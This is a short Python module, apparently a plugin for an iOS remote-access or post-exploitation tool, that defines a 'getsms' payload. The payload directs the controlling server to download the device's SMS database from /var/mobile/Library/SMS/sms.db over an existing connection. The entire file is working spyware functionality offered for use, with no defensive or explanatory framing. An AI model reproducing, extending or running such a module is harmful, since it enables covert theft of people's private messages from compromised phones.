class payload:
    def __init__(self):
        self.name = "getsms"
        self.description = "download sms database"
        self.type = "download"
        self.id = 123

    def run(self,conn,server,command):
        server.sendCommand("download","/var/mobile/Library/SMS/sms.db","download",conn)
        return ""
